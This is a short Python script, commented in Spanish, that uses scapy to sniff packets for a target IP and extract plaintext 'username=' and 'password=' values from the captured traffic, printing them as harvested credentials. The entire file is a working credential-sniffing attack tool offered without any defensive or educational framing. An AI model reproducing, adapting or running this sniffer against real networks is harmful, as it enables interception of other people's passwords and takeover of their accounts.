#!/usr/bin/env python
import scapy.all as scapy
import argparse
import time
import sys
import re

# Recibe los argumentos
def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", required=True, dest="target", help="Specify target ip")
    return parser.parse_args()

def packethandler(paquete):
	
	try:
		data = scapy.raw(paquete)
		
		m = re.search('(?<=username=)\w+', data) #identificador del username, en este caso es username=
		usuario = m.group(0)
		
		
		m = re.search('(?<=password=)\w+', data) #identificador de la password, en este caso es password=
		contra = m.group(0)
		
		print("--------------------------")
		print("Nombre de usuario:"+usuario)
		print("Contrasena:"+contra)
		print("--------------------------")
		
	except:
		pass

arguments = get_arguments()
packets = scapy.sniff(filter="host "+arguments.target,prn=packethandler)
